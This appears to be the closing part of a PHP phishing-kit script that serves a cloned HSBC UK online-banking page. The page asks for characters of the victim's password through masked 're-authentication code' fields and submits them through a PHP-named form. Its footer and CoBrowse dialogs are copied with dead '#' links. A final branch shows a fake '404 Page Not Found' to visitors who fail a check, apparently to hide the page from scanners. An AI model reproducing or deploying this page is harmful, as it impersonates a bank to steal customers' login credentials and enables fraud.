                                             <form>
                                                <div class="reautheticationCam30Wrapper">
                                                   <div class="cam30Instructions"></div>
                                                </div>
                                                <div class="passwordValidationWrapper">
                                                   <div class="wide formlabel forSelect twoLines reauthenticationLabel">
                                                      Re-authentication code<span class="infoIcon"><span tabindex="0" class="icon"></span> </span>
                                                   </div>
                                                   <div class="dijitTooltipData hidden3" id="hdx_dijits_Tooltip_53">
                                                      <div class="tooltiptext">
                                                         <p>Enter random characters from your password.</p>
                                                      </div>
                                                   </div>
                                                   <div class="passwordValidateBox" id="group_gpib_cmn_bijit_ReauthenticationCode_3">
                                                      <label class="accessible">Re-authentication code 1st digit</label>
                                                      <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox" id="widget_hdx_dijits_ValidationTextBox_26" role="presentation">
                                                         <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                         <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="firstTextBox" type="password" tabindex="0" id="hdx_dijits_ValidationTextBox_26" maxlength="1" value=""></div>
                                                      </div>
                                                      <label class="accessible">Re-authentication code 2nd digit</label>
                                                      <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox" id="widget_hdx_dijits_ValidationTextBox_27" role="presentation">
                                                         <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                         <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="secondTextBox" type="password" tabindex="0" id="hdx_dijits_ValidationTextBox_27" maxlength="1" value=""></div>
                                                      </div>
                                                      <label class="accessible">Re-authentication code 3rd digit</label>
                                                      <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox" id="widget_hdx_dijits_ValidationTextBox_28" role="presentation">
                                                         <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                         <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="thirdTextBox" type="password" tabindex="0" id="hdx_dijits_ValidationTextBox_28" maxlength="1" value=""></div>
                                                      </div>
                                                      <label class="accessible">Re-authentication code 4th digit</label>
                                                      <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox" id="widget_hdx_dijits_ValidationTextBox_29" role="presentation">
                                                         <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                         <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="fourthTextBox" type="password" tabindex="0" id="hdx_dijits_ValidationTextBox_29" maxlength="1" value=""></div>
                                                      </div>
                                                      <label class="accessible">Re-authentication code 5th digit</label>
                                                      <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox" id="widget_hdx_dijits_ValidationTextBox_30" role="presentation">
                                                         <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                         <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="fifthTextBox" type="password" tabindex="0" id="hdx_dijits_ValidationTextBox_30" maxlength="1" value=""></div>
                                                      </div>
                                                      <label class="accessible">Re-authentication code 6th digit</label>
                                                      <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox" id="widget_hdx_dijits_ValidationTextBox_31" role="presentation">
                                                         <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                         <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="sixthTextBox" type="password" tabindex="0" id="hdx_dijits_ValidationTextBox_31" maxlength="1" value=""></div>
                                                      </div>
                                                      <div class="validateBoxSpace">...</div>
                                                      <label class="accessible">Re-authentication code second last digit</label>
                                                      <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox" id="widget_hdx_dijits_ValidationTextBox_32" role="presentation">
                                                         <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                         <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="secondLastTextBox" type="password" tabindex="0" id="hdx_dijits_ValidationTextBox_32" maxlength="1" value=""></div>
                                                      </div>
                                                      <label class="accessible">Re-authentication code last digit</label>
                                                      <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox" id="widget_hdx_dijits_ValidationTextBox_33" role="presentation">
                                                         <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                         <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="lastTextBox" type="password" tabindex="0" id="hdx_dijits_ValidationTextBox_33" maxlength="1" value=""></div>
                                                      </div>
                                                      <div>
                                                         <div><span class="reauthenticationError"></span></div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </form>
                                          </div>
                                       </div>
                                    </div>
<div class="submitButtonsPanel">
        <div class="acceptTermsRow hide">
                <div class="terms linkingTermsandConditions" id="hdx_bijits_form_TermsAndConditions_8">
    <div class="dijit dijitReset dijitInline dijitCheckBox labeledCheckbox" role="presentation"><input name="terms" type="checkbox" role="checkbox" class="dijitReset dijitCheckBoxInput" tabindex="0" id="hdx_bijits_form_TermsAndConditions_8terms" value="1" style="user-select: none;"></div>
    
    <label class="accessible" for="hdx_bijits_form_TermsAndConditions_8terms">I have read and accept the United Kingdom Global View terms &amp; condition </label>
    <span class="labeledCheckbox terms">
	    <span tabindex="0" class="link longTextWrapTermsAndConditions" role="link">I have read and accept the <u>Terms &amp; Conditions\'s</u><span class="accessible">Opens in an overlay</span></span>
    </span>
    
</div>
        </div>
        <div>
            
            <span class="dijit dijitReset dijitInline btnSecondary dijitButton" role="presentation"><span class="dijitReset dijitInline dijitButtonNode" role="presentation"><span class="dijitReset dijitStretch dijitButtonContents" onclick="document.forms[\''.$fname.'\'].submit();" role="button" style="user-select: none;" tabindex="0"><span class="dijitReset dijitInline dijitIcon dijitNoIcon"></span><span class="dijitReset dijitToggleButtonIconChar">●</span><span class="dijitReset dijitInline dijitButtonText">Continue</span></span></span><input type="button" value="" class="dijitOffScreen" tabindex="-1" role="presentation"></span>
             <button type="button" class="btnTertiary">Cancel<span class="accessible">opens in overlay</span></button>
            <span class="ajaxLoader" style="display: none;"></span>
        </div>
    </div>

                                 </div>
                              </div>
                              <div></div>
                              <div class="moveMoneyContainer noDisplay">
                                 <div class="VaryingContainer"></div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div></div>
                  <div class="basicPromotionWrapper">
                     <div id="baseSlot1"></div>
                  </div>
               </div>
               <div id="overlaySlot1"></div>
            </div>
         </div>
      
      <div class="" id="_footer" style="/*! position: relative; */ /*! top: 10px; */" lang="en-gb" align="center">
         <div class="footer-wrapper gradient3">
            <div class="footerTopLine gradient2 font18">
               <ul>
                  <li class="contact"><a href="#">Contact HSBC</a></li>
                  <li class="find"><a href="#">Find a branch or ATM</a></li>
               </ul>
            </div>
            <div class="footer clearfix">
               <div class="col">
                  <h2>Help and support</h2>
                  <ul>
                     <li><a href="#">Contact and support</a></li>
                     <li><a href="#">Security centre</a></li>
                     <li><a href="#">CoBrowse</a></li>
                  </ul>
               </div>
               <div class="col">
                  <h2>My profile</h2>
                  <ul>
                     <li><a href="#">Personal &amp; address details</a></li>
                     <li><a href="#">Communication preferences</a></li>
                  </ul>
               </div>
               <div class="col">
                  <h2>Secure Key</h2>
                  <ul>
                     <li><a href="#">Switch my Secure Key</a></li>
                     <li><a href="#">Change personal security details</a></li>
                     <li><a href="#">Change my password</a></li>
                     <li><a href="#">Help with my Secure Key</a></li>
                  </ul>
               </div>
               <div class="hr">
                  <hr>
               </div>
               <ul class="baseline">
                  <li><a href="#">Legal</a></li>
                  <li><a href="#">Privacy notice</a></li>
                  <li><a href="#">Cookie policy</a></li>
                  <li><a href="#">Accessibility</a></li>
                  <li><a href="#">Careers</a></li>
                  <li><a href="#">Security information</a></li>
                  <li><a href="#">HSBC Group</a></li>
                  <li class="fr last copyright">©HSBC Group 2020</li>
               </ul>
            </div>
         </div>
      </div>
      <div class="iwHidden iwActivityDefault"></div>
      <style> .CoBrowseFade {display:none;position: fixed;left: 0 !important;top: 0 !important;bottom: 0 !important;right: 0 !important;width: 100%;height: 100%;z-index: 3000;background: rgba(0, 0, 0, 0.6);} .modale-shadowCob{display:block;width:100%;height:100%;top:0;left:0;z-index:9110;background:rgba(0, 0, 0, .7);cursor:pointer;z-index:9250}.modale{transition:opacity .25s cubic-bezier(0, .7, .38, 1);-webkit-transition:opacity .25s cubic-bezier(0, .7, .38, 1);-moz-transition:opacity .25s cubic-bezier(0, .7, .38, 1);-o-transition:opacity .25s cubic-bezier(0, .7, .38, 1);opacity:1;visibility:visible;position:fixed;font-family:sans-serif}.modale.hidden{opacity:0;visibility:hidden}.modale-content{z-index:9251;background:white;border:2px solid #DDDDDD;text-align:left;top:50%;left:50%;-webkit-transform:translate(-50%, -50%);-ms-transform:translate(-50%, -50%);transform:translate(-50%, -50%);padding:40px;width:540px}.modale-content .content{max-height:410px;overflow-y:auto;overflow-x:hidden}.modale-title{font-weight: normal !important;font-size:28px !important;line-height:28px !important;margin-bottom:15px;padding-bottom:0 !important;color:#333 !important;text-align:center}.modale-text{ line-height: 17px !important;margin-bottom:24px;font-size:16px !important;padding-bottom:0 !important}.modale-text img{max-width:100%}.modale-text--center{text-align:center}.buttonCloseModale {font-size: 40px; color: #333;  cursor: pointer;  position: absolute;  top: 15px;  right: 20px; height: 42px;width: 40px;text-align: center;}.buttonCloseModale:hover{color:#b6b7b6;cursor:pointer} .buttonCloseModale:focus { border: 1px solid black; } .text-non{margin-bottom:10px}.text-non span{color:#db0011}body .modale-img{max-width:100%;text-align:center}.modale-text--center{text-align:center}.selectRadioPopin{margin-bottom:26px;font-size:16px;color:#333}.modale-list{margin-left:6px;margin-top:16px;padding-bottom:37px;padding-left:18px;width:51%;display:inline-block}.modale-list li{padding-bottom:0;font-size:16px;text-align:left}.selectTitle,.radioGroup,.radio{display:inline-block}.radio{margin-left:32px;margin-bottom:3px}.buttonsModale{width:100%;padding:10px 0;display:inline-block;border-top:0 !important;margin-top:10px}.modaleBtnOui{display:inline-block;text-align:center;text-decoration:none;font-family:sans-serif;font-size:16px;padding:15px 20px;background-color:#db0011;color:white;line-height:1 !important}.modaleBtnOui:hover{background-color:#A4000D;text-decoration:none;color:white}.modaleBtnOui:active, .modaleBtnOui:focus{background-color:#83000A;text-decoration:none;color:white;outline:none}.modaleBtnNon{display:inline-block;text-align:center;text-decoration:none;font-family:sans-serif;font-size:16px;padding:14px 20px;text-decoration:none;cursor:pointer;border:1px solid #333;color:#333;margin-right:8px;line-height:1 !important}.modaleBtnNon:hover{border:1px solid #333;background-color:rgba(0, 0, 0, 0.05);text-decoration:none;color:#333}.modaleBtnNon:active, .modaleBtnNon:focus {border:1px solid #333;background-color:rgba(0, 0, 0, 0.15);text-decoration:none;color:#333;outline:none}.disclaimerPopin{display:inline-block;color:#333;font-size:14px}body .buttonsModale a.continueBtn{float:right}.CoBrowseTextInput input{border:1px solid #ccc;margin:0 7px 3px 0;padding:10px;width:264px}.modale-text.error_red{color:#db0011;margin:0;font-size:14px!important;}span.error_input_exclamation{background-color:#db0011;padding:5px 12px 2px 12px;font-size:22px;margin-left:-38px;font-weight:bold;color:#fff;vertical-align:middle} label.modale-text {font-weight: bold !important; display:inline-block; margin-bottom: 12px;} .CoBrowseCheckBox:focus {outline: 1px solid black;}</style>
      <div tabindex="-1">
         <div id="CoBrowseBackgroundOverlay1" class="CoBrowseFade"></div>
         <div class="modale modale-content hidden" role="dialog" id="modale-cob1" tabindex="0">
            <div class="content">
               <div tabindex="0" role="button" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob1">×</div>
               <h3 id="dialogTitleDiv1" class="modale-title">CoBrowse</h3>
               <div id="dialogDescriptionDiv1">
                  <p class="modale-text">CoBrowse allows you to share your screen with a Contact Centre Agent if you need help with HSBC Online Banking.</p>
                  <p class="modale-text">This
                     service is only available during business hours and if during your call
                     or Live Chat conversation your query could be supported by CoBrowse, 
                     your Contact Centre Agent will provide a CoBrowse Service Number to 
                     start the service.
                  </p>
                  <p class="modale-text">Please enter the CoBrowse Service Number provided by our Contact Centre Agent below.</p>
               </div>
               <div> <label for="cobrowseIDSession1" class="modale-text">CoBrowse Service Number:</label> </div>
               <div class="CoBrowseTextInput"><input type="text" name="idSession" id="cobrowseIDSession1"></div>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" title="" href="#" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="nextCob" href="#" title="" style="outline: 0px;">Continue</a></div>
         </div>
      </div>
      <div tabindex="-1">
         <div id="CoBrowseBackgroundOverlay2" class="CoBrowseFade"></div>
         <div class="modale modale-content hidden" role="dialog" id="modale-cob2" tabindex="0">
            <div class="content">
               <div tabindex="0" role="button" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob2">×</div>
               <h3 id="dialogTitleDiv2" class="modale-title">CoBrowse Terms and Conditions</h3>
               <div id="dialogDescriptionDiv2">
                  <p class="modale-text">This
                     service allows HSBC UK’s Contact Centre Agent to see your web browser, 
                     as it appears on your own device. For security and privacy reasons the 
                     Contact Centre Agent won’t be able to see any other applications running
                     on your device. They also won’t be able to type, press buttons, make 
                     any applications or transactions for you and can’t see passwords or 
                     other security information even if they’re visible on your device.
                  </p>
                  <p class="modale-text">If
                     you agree to this service, please tick the box below to accept the 
                     Terms and Conditions then select ‘Continue’ to start the session.
                  </p>
               </div>
               <p class="modale-text"><input class="CoBrowseCheckBox" type="checkbox" name="checkbox" id="checkbox"><label style="font-size: 16px;" for="checkbox">&nbsp;I have read and accept the Terms and Conditions</label></p>
               <div class="modale hidden" id="tealiumAcceptTC" style="margin-top:-22px;color: #db0011;margin-left: 0px;">
                  <p role="alert" style="font-size:14px">Please accept the Terms and Conditions</p>
               </div>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" title="" href="#" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="launchCob" href="#" title="" style="outline: 0px;">Continue</a></div>
         </div>
         <div class="modale modale-shadowCob hidden"></div>
      </div>
      <div tabindex="-1">
         <div id="CoBrowseBackgroundOverlay3" class="CoBrowseFade"></div>
         <div class="modale modale-content hidden" role="dialog" id="modale-cob3" tabindex="0">
            <div class="content">
               <div tabindex="0" role="button" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob3">×</div>
               <h3 id="dialogTitleDiv3" class="modale-title">CoBrowse</h3>
               <div id="dialogDescriptionDiv3">
                  <p class="modale-text"><br>CoBrowse allows you to share your screen with a Contact Centre Agent if you need help with HSBC Online Banking.</p>
                  <p class="modale-text">This
                     service is only available during business hours and if during your call
                     or Live Chat conversation your query could be supported by CoBrowse, 
                     your Contact Centre Agent will provide a CoBrowse Service Number to 
                     start the service.
                  </p>
                  <p class="modale-text">Please enter the CoBrowse Service Number provided by our Contact Centre Agent below.</p>
               </div>
               <div> <label for="cobrowseIDSession3" class="modale-text">CoBrowse Service Number:</label> </div>
               <div class="CoBrowseTextInput">
                  <input type="text" name="idSession" id="cobrowseIDSession3"><span class="error_input_exclamation">!</span>
                  <p id="termsAndConditionError" role="alert" class="modale-text error_red">The CoBrowse Service Number you have entered doesn\'t match our records. Please try again.</p>
               </div>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" title="" href="#" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="restartCob" href="#" title="" style="outline: 0px;">Continue</a></div>
         </div>
         <div class="modale modale-shadowCob hidden"></div>
      </div>
      <div tabindex="-1">
         <div id="CoBrowseBackgroundOverlay4" class="CoBrowseFade"></div>
         <div class="modale modale-content hidden" role="dialog" id="modale-cob4" tabindex="0">
            <div class="content">
               <div tabindex="0" role="button" class="buttonCloseModale modale-closeCob icon icon-delete" id="fermerCob4">×</div>
               <h3 id="dialogTitleDiv4" class="modale-title">CoBrowse</h3>
               <div id="dialogDescriptionDiv4">
                  <p class="modale-text"><strong>Please enter a valid CoBrowse Service Number</strong></p>
                  <p class="modale-text">Please check the CoBrowse Service Number with the customer service representative and enter it again.</p>
               </div>
               <div> <label for="cobrowseIDSession4" class="modale-text">CoBrowse Service Number:</label> </div>
               <div class="CoBrowseTextInput"><input type="text" name="idSession" id="cobrowseIDSession4"></div>
            </div>
            <div class="buttonsModale"><a class="modaleBtnNon modale-closeCob" title="" href="#" style="outline: 0px;">Cancel</a><a class="modaleBtnOui modale-closeCob" id="restartCob" href="#" title="" style="outline: 0px;">Continue</a></div>
         </div>
         <div class="modale modale-shadowCob hidden"></div>
      </div>
</body>
</html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>